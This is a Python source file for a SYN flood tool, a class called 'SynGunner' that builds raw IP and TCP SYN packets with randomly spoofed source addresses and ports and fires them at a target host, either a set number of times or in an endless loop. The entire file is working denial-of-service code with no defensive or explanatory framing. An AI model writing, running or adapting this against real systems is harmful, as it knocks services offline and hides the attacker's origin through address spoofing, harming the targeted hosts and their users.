'''
    Syn packet builder based on:
    Silver Moon (m00n.silv3r@gmail.com)
    http://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
'''

import socket, sys, struct


class SynGunner(object):
    def __init__(self, target_ip, target_port, source_ip=None, source_port=None, sock=None, static_packet=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_ip = source_ip
        self.source_port = source_port
        self.sock = get_socket() if sock is None else sock
        self.static_packet = static_packet
        self.packet = build_packet(target_ip, target_port, source_ip, source_port)

    def _get_packet(self):
        if not self.static_packet:
            return build_packet(self.target_ip, self.target_port, self.source_ip, self.source_port)
        else:
            return self.packet

    def fire_once(self):
        print('Firing SYN to {}'.format(self.target_ip))
        self.sock.sendto(self._get_packet(), (self.target_ip, 0))

    def fire_rounds(self, amount):
        for _ in range(amount):
            self.fire_once()

    def open_fire(self):
        while True:
            self.fire_once()

    def stand_down():
        self.sock.close()
        


def _checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i+1]
        s = s + w

    s = (s>>16) + (s & 0xffff)
    # complement and mask to 4 byte short
    return ~s & 0xffff


def get_socket():
    # Create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as msg:
        print('Socket could not be created. Error Code : {c}. Message: {m}'.format(c=str(msg[0]), m=msg[1]))
        sys.exit()

    # Tell kernel not to put in headers, since we are providing it
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return s


def build_packet(destination, dst_port, src_ip=None, src_port=None):
    """ Build and return a packet destined to a given target.
    Destination can be either an IP or hostname.
    If source IP and/or port are None, then they are spoofed.
    """
    if src_ip is None or src_port is None:
        import random
    if src_ip is None:
        src_ip = '{fo}.{o}'.format(fo=random.choice(('192', '172', '10')), o='.'.join([str(random.randint(1,255)) for _ in range(3)]))
    if src_port is None:
        src_port = random.randint(2500, 65535)
    dst_ip = socket.gethostbyname(destination)
    iph = get_ip_header(src_ip, dst_ip)
    tcph = get_syn_tcp_header(src_ip, src_port, dst_ip, dst_port)
    return iph + tcph


def get_ip_header(src_ip, dst_ip):
    import random
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
    packetid = random.randint(10000, 60000)
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  # python seems to correctly fill the checksum
    saddr = socket.inet_aton(src_ip)  # Spoof the source ip address if you want to
    daddr = socket.inet_aton(dst_ip)

    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    return struct.pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, packetid, frag_off, ttl, protocol, check, saddr, daddr)


def get_syn_tcp_header(src_ip, src_port, dst_ip, dst_port):
    # TODO: Be able to build other packets
    seq = 0
    ack_seq = 0
    doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
    #tcp flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)    #   maximum allowed window size
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    # the ! in the pack format string means network order
    tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

    # pseudo tcp header fields
    source_address = socket.inet_aton(src_ip)
    dest_address = socket.inet_aton(dst_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
    psh = psh + tcp_header

    return struct.pack('!HHLLBBHHH' , src_port, dst_port, seq, ack_seq, offset_res, tcp_flags,  window, _checksum(psh) , urg_ptr)
